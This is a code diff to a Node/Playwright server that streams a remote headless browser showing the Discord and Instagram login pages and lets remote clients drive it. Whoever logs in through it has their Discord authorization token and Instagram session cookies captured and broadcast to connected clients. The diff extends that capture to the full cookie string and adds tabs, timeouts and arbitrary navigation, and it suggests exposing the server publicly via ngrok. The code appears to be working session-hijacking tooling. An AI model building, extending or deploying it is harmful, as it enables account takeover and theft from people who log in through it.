@@ -3,7 +3,8 @@
 // playwright-server.js — Discord + Instagram login server
 //
 // Runs both services simultaneously. Each gets its own
-// browser instance. Clients connect via query param:
+// browser instance with multi-tab support. Clients connect
+// via query param:
 //
 // Usage:
 //   node playwright-server.js
@@ -39,6 +40,8 @@ const BROWSER_HEIGHT = 720;
 const SCREENSHOT_INTERVAL_MS = 100; // 10fps
 const SCREENSHOT_QUALITY = 70;      // JPEG quality
 const MAX_CLIENTS = 3;              // per service
+const MAX_TABS = 5;                 // per service
+const DEFAULT_TIMEOUT_S = 60;       // 1 minute idle timeout
 
 const URLS = {
     discord:   'https://discord.com/login',
@@ -60,20 +63,68 @@ const CHROME_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 
 // ── Per-service state ─────────────────────────────────────
 const SVC = {
     discord: {
-        browser: null, page: null,
+        browser: null,
+        context: null,
+        pages: [],          // array of { page, id }
+        activeTabIndex: 0,
         screenshotInterval: null,
         tokenCaptured: false,
         capturedToken: null,
-        clients: new Set()
+        clients: new Set(),
+        lastActivity: Date.now(),
+        timeoutTimer: null,
+        timeoutSeconds: DEFAULT_TIMEOUT_S
     },
     instagram: {
-        browser: null, page: null,
+        browser: null,
+        context: null,
+        pages: [],
+        activeTabIndex: 0,
         screenshotInterval: null,
         tokenCaptured: false,
         capturedSession: null,
-        clients: new Set()
+        clients: new Set(),
+        lastActivity: Date.now(),
+        timeoutTimer: null,
+        timeoutSeconds: DEFAULT_TIMEOUT_S
     }
 };
+
+// ── Helper: get active page ──────────────────────────────
+function getActivePage(svc) {
+    if (!svc.pages.length) return null;
+    const idx = Math.min(svc.activeTabIndex, svc.pages.length - 1);
+    return svc.pages[idx]?.page || null;
+}
+
+function getTabList(svc) {
+    return svc.pages.map((t, i) => ({
+        id: t.id,
+        index: i,
+        title: t.title || 'New Tab',
+        active: i === svc.activeTabIndex
+    }));
+}
+
+// ── Activity tracking & timeout ──────────────────────────
+function touchActivity(svc, svcName) {
+    svc.lastActivity = Date.now();
+    resetTimeoutTimer(svc, svcName);
+}
+
+function resetTimeoutTimer(svc, svcName) {
+    if (svc.timeoutTimer) clearTimeout(svc.timeoutTimer);
+    if (svc.timeoutSeconds <= 0 || svc.tokenCaptured) return;
+    svc.timeoutTimer = setTimeout(() => {
+        if (svc.clients.size === 0) return;
+        const idleSec = Math.floor((Date.now() - svc.lastActivity) / 1000);
+        if (idleSec >= svc.timeoutSeconds) {
+            console.log(`[${svcName}] Idle timeout (${idleSec}s) — disconnecting clients`);
+            broadcast(svc, { type: 'timeout', message: `Disconnected after ${svc.timeoutSeconds}s of inactivity` });
+            for (const ws of svc.clients) ws.close(1000, 'Idle timeout');
+        }
+    }, svc.timeoutSeconds * 1000);
+}
 
 // ── HTTP Server ───────────────────────────────────────────
 const server = http.createServer((req, res) => {
@@ -87,8 +138,20 @@ const server = http.createServer((req, res) => {
         res.writeHead(200, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({
             ok: true,
-            discord:   { ready: !!SVC.discord.page,   clients: SVC.discord.clients.size,   captured: SVC.discord.tokenCaptured,   hasCachedToken: !!SVC.discord.capturedToken },
-            instagram: { ready: !!SVC.instagram.page, clients: SVC.instagram.clients.size, captured: SVC.instagram.tokenCaptured, hasCachedSession: !!SVC.instagram.capturedSession }
+            discord: {
+                ready: !!getActivePage(SVC.discord),
+                clients: SVC.discord.clients.size,
+                captured: SVC.discord.tokenCaptured,
+                hasCachedToken: !!SVC.discord.capturedToken,
+                tabs: SVC.discord.pages.length
+            },
+            instagram: {
+                ready: !!getActivePage(SVC.instagram),
+                clients: SVC.instagram.clients.size,
+                captured: SVC.instagram.tokenCaptured,
+                hasCachedSession: !!SVC.instagram.capturedSession,
+                tabs: SVC.instagram.pages.length
+            }
         }));
         return;
     }
@@ -97,7 +160,6 @@ const server = http.createServer((req, res) => {
 });
 
 // ── WebSocket Server ──────────────────────────────────────
-// Connect to /stream?type=discord or /stream?type=instagram
 const wss = new WebSocketServer({ server });
 
 wss.on('connection', (ws, req) => {
@@ -114,7 +176,14 @@ wss.on('connection', (ws, req) => {
         return;
     }
 
+    // Client can set timeout via query param
+    const clientTimeout = parseInt(parsed.searchParams.get('timeout'));
+    if (!isNaN(clientTimeout) && clientTimeout >= 0) {
+        svc.timeoutSeconds = clientTimeout;
+    }
+
     svc.clients.add(ws);
+    touchActivity(svc, svcName);
     console.log(`[${svcName}] Client connected (${svc.clients.size} total)`);
 
     ws.on('close', () => {
@@ -127,6 +196,81 @@ wss.on('connection', (ws, req) => {
     ws.on('message', async (raw) => {
         let msg;
         try { msg = JSON.parse(raw); } catch (_) { return; }
+        touchActivity(svc, svcName);
+
+        // ── Tab management commands ──────────────────────
+        if (msg.type === 'newtab') {
+            if (svc.pages.length >= MAX_TABS) {
+                send(ws, { type: 'error', message: `Max ${MAX_TABS} tabs reached` });
+                return;
+            }
+            try {
+                const page = await svc.context.newPage();
+                const tabId = 'tab-' + Date.now();
+                await page.goto(msg.url || URLS[svcName], { waitUntil: 'domcontentloaded' });
+                const title = await page.title().catch(() => 'New Tab');
+                svc.pages.push({ page, id: tabId, title });
+                if (svcName === 'discord') setupDiscordCapture(svc, svc.pages.length - 1);
+                else setupInstagramCapture(svc, svc.pages.length - 1);
+                svc.activeTabIndex = svc.pages.length - 1;
+                broadcast(svc, { type: 'tabs', tabs: getTabList(svc) });
+                console.log(`[${svcName}] New tab opened: ${tabId}`);
+            } catch (e) {
+                send(ws, { type: 'error', message: 'Failed to open new tab: ' + e.message });
+            }
+            return;
+        }
+
+        if (msg.type === 'switchtab') {
+            const idx = typeof msg.index === 'number' ? msg.index : -1;
+            if (idx >= 0 && idx < svc.pages.length) {
+                svc.activeTabIndex = idx;
+                broadcast(svc, { type: 'tabs', tabs: getTabList(svc) });
+                // Send immediate screenshot of new tab
+                const page = getActivePage(svc);
+                if (page) {
+                    try {
+                        const buf = await page.screenshot({ type: 'jpeg', quality: SCREENSHOT_QUALITY });
+                        broadcast(svc, { type: 'screenshot', data: buf.toString('base64'), width: BROWSER_WIDTH, height: BROWSER_HEIGHT, tabIndex: svc.activeTabIndex });
+                    } catch (_) {}
+                }
+            }
+            return;
+        }
+
+        if (msg.type === 'closetab') {
+            const idx = typeof msg.index === 'number' ? msg.index : svc.activeTabIndex;
+            if (svc.pages.length <= 1) {
+                send(ws, { type: 'error', message: 'Cannot close the last tab' });
+                return;
+            }
+            if (idx >= 0 && idx < svc.pages.length) {
+                const removed = svc.pages.splice(idx, 1)[0];
+                try { await removed.page.close(); } catch (_) {}
+                if (svc.activeTabIndex >= svc.pages.length) svc.activeTabIndex = svc.pages.length - 1;
+                broadcast(svc, { type: 'tabs', tabs: getTabList(svc) });
+                console.log(`[${svcName}] Tab closed: ${removed.id}`);
+            }
+            return;
+        }
+
+        if (msg.type === 'navigate') {
+            const page = getActivePage(svc);
+            if (page && msg.url) {
+                try { await page.goto(msg.url, { waitUntil: 'domcontentloaded' }); } catch (_) {}
+            }
+            return;
+        }
+
+        if (msg.type === 'settimeout') {
+            const t = parseInt(msg.seconds);
+            if (!isNaN(t) && t >= 0) {
+                svc.timeoutSeconds = t;
+                resetTimeoutTimer(svc, svcName);
+                broadcast(svc, { type: 'status', text: t > 0 ? `Timeout set to ${t}s` : 'Timeout disabled' });
+            }
+            return;
+        }
 
         if (msg.type === 'reset') {
             if (!svc.tokenCaptured) return;
@@ -146,10 +290,12 @@ wss.on('connection', (ws, req) => {
             return;
         }
 
-        if (!svc.page) return;
+        const page = getActivePage(svc);
+        if (!page) return;
         await handleInput(svc, msg);
     });
 
+    // Send initial state
     if (svc.tokenCaptured) {
         if (svcName === 'instagram' && svc.capturedSession) {
             send(ws, { type: 'session', ...svc.capturedSession });
@@ -160,11 +306,15 @@ wss.on('connection', (ws, req) => {
         }
         return;
     }
-    send(ws, { type: 'status', text: 'Connected — log in to continue' });
 
-    if (svc.page && !svc.tokenCaptured) {
-        svc.page.screenshot({ type: 'jpeg', quality: SCREENSHOT_QUALITY })
-            .then(buf => send(ws, { type: 'screenshot', data: buf.toString('base64'), width: BROWSER_WIDTH, height: BROWSER_HEIGHT }))
+    send(ws, { type: 'status', text: 'Connected — log in to continue' });
+    send(ws, { type: 'tabs', tabs: getTabList(svc) });
+    send(ws, { type: 'config', timeout: svc.timeoutSeconds });
+
+    const page = getActivePage(svc);
+    if (page && !svc.tokenCaptured) {
+        page.screenshot({ type: 'jpeg', quality: SCREENSHOT_QUALITY })
+            .then(buf => send(ws, { type: 'screenshot', data: buf.toString('base64'), width: BROWSER_WIDTH, height: BROWSER_HEIGHT, tabIndex: svc.activeTabIndex }))
             .catch(() => {});
     }
 });
@@ -186,20 +336,21 @@ function broadcast(svc, data) {
 
 // ── Input handling ────────────────────────────────────────
 async function handleInput(svc, msg) {
-    if (!svc.page) return;
+    const page = getActivePage(svc);
+    if (!page) return;
     try {
         const bx = (msg.x ?? 0) * BROWSER_WIDTH;
         const by = (msg.y ?? 0) * BROWSER_HEIGHT;
         switch (msg.type) {
-            case 'mousemove': await svc.page.mouse.move(bx, by); break;
-            case 'click':     await svc.page.mouse.click(bx, by, { button: msg.button || 'left' }); break;
-            case 'dblclick':  await svc.page.mouse.dblclick(bx, by); break;
-            case 'mousedown': await svc.page.mouse.down({ button: msg.button || 'left' }); break;
-            case 'mouseup':   await svc.page.mouse.up({ button: msg.button || 'left' }); break;
-            case 'scroll':    await svc.page.mouse.wheel(msg.deltaX || 0, msg.deltaY || 0); break;
-            case 'keydown':   if (msg.key) await svc.page.keyboard.down(normalizeKey(msg.key)); break;
-            case 'keyup':     if (msg.key) await svc.page.keyboard.up(normalizeKey(msg.key)); break;
-            case 'input':     if (msg.text) await svc.page.keyboard.type(msg.text); break;
+            case 'mousemove': await page.mouse.move(bx, by); break;
+            case 'click':     await page.mouse.click(bx, by, { button: msg.button || 'left' }); break;
+            case 'dblclick':  await page.mouse.dblclick(bx, by); break;
+            case 'mousedown': await page.mouse.down({ button: msg.button || 'left' }); break;
+            case 'mouseup':   await page.mouse.up({ button: msg.button || 'left' }); break;
+            case 'scroll':    await page.mouse.wheel(msg.deltaX || 0, msg.deltaY || 0); break;
+            case 'keydown':   if (msg.key) await page.keyboard.down(normalizeKey(msg.key)); break;
+            case 'keyup':     if (msg.key) await page.keyboard.up(normalizeKey(msg.key)); break;
+            case 'input':     if (msg.text) await page.keyboard.type(msg.text); break;
         }
     } catch (_) {}
 }
@@ -220,10 +371,17 @@ function normalizeKey(key) {
 function startScreenshots(svc, svcName) {
     if (svc.screenshotInterval) return;
     svc.screenshotInterval = setInterval(async () => {
-        if (!svc.page || svc.clients.size === 0 || svc.tokenCaptured) return;
+        if (!svc.pages.length || svc.clients.size === 0 || svc.tokenCaptured) return;
+        const page = getActivePage(svc);
+        if (!page) return;
         try {
-            const buf = await svc.page.screenshot({ type: 'jpeg', quality: SCREENSHOT_QUALITY });
-            broadcast(svc, { type: 'screenshot', data: buf.toString('base64'), width: BROWSER_WIDTH, height: BROWSER_HEIGHT });
+            // Update tab title periodically
+            const title = await page.title().catch(() => '');
+            if (title && svc.pages[svc.activeTabIndex]) {
+                svc.pages[svc.activeTabIndex].title = title;
+            }
+            const buf = await page.screenshot({ type: 'jpeg', quality: SCREENSHOT_QUALITY });
+            broadcast(svc, { type: 'screenshot', data: buf.toString('base64'), width: BROWSER_WIDTH, height: BROWSER_HEIGHT, tabIndex: svc.activeTabIndex });
         } catch (_) {}
     }, SCREENSHOT_INTERVAL_MS);
 }
@@ -233,8 +391,10 @@ function stopScreenshots(svc) {
 }
 
 // ── Token extraction ──────────────────────────────────────
-function setupDiscordCapture(svc) {
-    svc.page.on('request', (request) => {
+function setupDiscordCapture(svc, pageIndex) {
+    const entry = svc.pages[pageIndex];
+    if (!entry) return;
+    entry.page.on('request', (request) => {
         if (svc.tokenCaptured) return;
         if (!request.url().includes('discord.com/api/')) return;
         const auth = request.headers()['authorization'];
@@ -249,23 +409,30 @@ function setupDiscordCapture(svc) {
     });
 }
 
-function setupInstagramCapture(svc) {
+function setupInstagramCapture(svc, pageIndex) {
+    const entry = svc.pages[pageIndex];
+    if (!entry) return;
     let polling = false;
-    svc.page.on('framenavigated', async () => {
+    entry.page.on('framenavigated', async () => {
         if (svc.tokenCaptured || polling) return;
-        const url = svc.page.url();
+        const url = entry.page.url();
         if (url.includes('/login') || url.includes('/challenge') || url.includes('/accounts/')) return;
         polling = true;
         try {
-            await svc.page.waitForTimeout(1500);
-            const cookies = await svc.page.context().cookies('https://www.instagram.com');
+            await entry.page.waitForTimeout(1500);
+            const cookies = await svc.context.cookies('https://www.instagram.com');
             const sessionCookie = cookies.find(c => c.name === 'sessionid');
             const csrfCookie    = cookies.find(c => c.name === 'csrftoken');
             if (sessionCookie?.value) {
                 svc.tokenCaptured = true;
-                svc.capturedSession = { sessionId: sessionCookie.value, csrfToken: csrfCookie?.value || '' };
+                const fullCookieStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
+                svc.capturedSession = {
+                    sessionId: sessionCookie.value,
+                    csrfToken: csrfCookie?.value || '',
+                    fullCookies: fullCookieStr
+                };
                 stopScreenshots(svc);
-                console.log('[instagram] Session captured!');
+                console.log('[instagram] Session captured! (' + cookies.length + ' cookies)');
                 broadcast(svc, { type: 'session', ...svc.capturedSession });
                 setTimeout(() => closeBrowser(svc, 'instagram'), 3000);
             }
@@ -280,46 +447,53 @@ async function launchBrowser(svcName) {
     console.log(`[${svcName}] Launching Chromium...`);
 
     svc.browser = await chromium.launch({ headless: true, args: LAUNCH_ARGS });
-    const context = await svc.browser.newContext({
+    svc.context = await svc.browser.newContext({
         viewport: { width: BROWSER_WIDTH, height: BROWSER_HEIGHT },
         userAgent: CHROME_UA
     });
-    svc.page = await context.newPage();
+    const page = await svc.context.newPage();
+    const tabId = 'tab-' + Date.now();
+    svc.pages = [{ page, id: tabId, title: svcName }];
+    svc.activeTabIndex = 0;
 
-    if (svcName === 'discord') setupDiscordCapture(svc);
-    else setupInstagramCapture(svc);
+    if (svcName === 'discord') setupDiscordCapture(svc, 0);
+    else setupInstagramCapture(svc, 0);
 
     console.log(`[${svcName}] Navigating to ${URLS[svcName]}...`);
-    await svc.page.goto(URLS[svcName], { waitUntil: 'domcontentloaded' });
+    await page.goto(URLS[svcName], { waitUntil: 'domcontentloaded' });
 
     // Auto-fill if credentials are set
     if (svcName === 'discord' && CFG.discord.email && CFG.discord.password) {
         console.log('[discord] Auto-filling credentials...');
         try {
-            await svc.page.fill('input[name="email"]', CFG.discord.email);
-            await svc.page.fill('input[name="password"]', CFG.discord.password);
-            await svc.page.click('button[type="submit"]');
+            await page.fill('input[name="email"]', CFG.discord.email);
+            await page.fill('input[name="password"]', CFG.discord.password);
+            await page.click('button[type="submit"]');
         } catch (_) { console.log('[discord] Auto-fill failed — waiting for manual login'); }
     } else if (svcName === 'instagram' && CFG.instagram.username && CFG.instagram.password) {
         console.log('[instagram] Auto-filling credentials...');
         try {
-            await svc.page.fill('input[name="username"]', CFG.instagram.username);
-            await svc.page.fill('input[name="password"]', CFG.instagram.password);
-            await svc.page.click('button[type="submit"]');
+            await page.fill('input[name="username"]', CFG.instagram.username);
+            await page.fill('input[name="password"]', CFG.instagram.password);
+            await page.click('button[type="submit"]');
         } catch (_) { console.log('[instagram] Auto-fill failed — waiting for manual login'); }
     }
 
     broadcast(svc, { type: 'status', text: 'Browser ready — log in below' });
+    broadcast(svc, { type: 'tabs', tabs: getTabList(svc) });
     startScreenshots(svc, svcName);
     console.log(`[${svcName}] Ready.`);
 }
 
 async function closeBrowser(svc, svcName) {
     stopScreenshots(svc);
+    if (svc.timeoutTimer) { clearTimeout(svc.timeoutTimer); svc.timeoutTimer = null; }
     if (svc.browser) {
         try { await svc.browser.close(); } catch (_) {}
         svc.browser = null;
-        svc.page = null;
+        svc.context = null;
+        svc.pages = [];
+        svc.activeTabIndex = 0;
     }
     console.log(`[${svcName}] Browser closed.`);
 }
@@ -330,6 +504,8 @@ server.listen(PORT, async () => {
     console.log(`  Discord   → ws://localhost:${PORT}/stream?type=discord`);
     console.log(`  Instagram → ws://localhost:${PORT}/stream?type=instagram`);
     console.log(`  Status    → http://localhost:${PORT}/status`);
+    console.log(`  Timeout   → ${DEFAULT_TIMEOUT_S}s (configurable per client)`);
+    console.log(`  Max tabs  → ${MAX_TABS} per service`);
     console.log(`\nExpose with: ngrok http ${PORT}\n`);
 
     // Launch both browsers in parallel
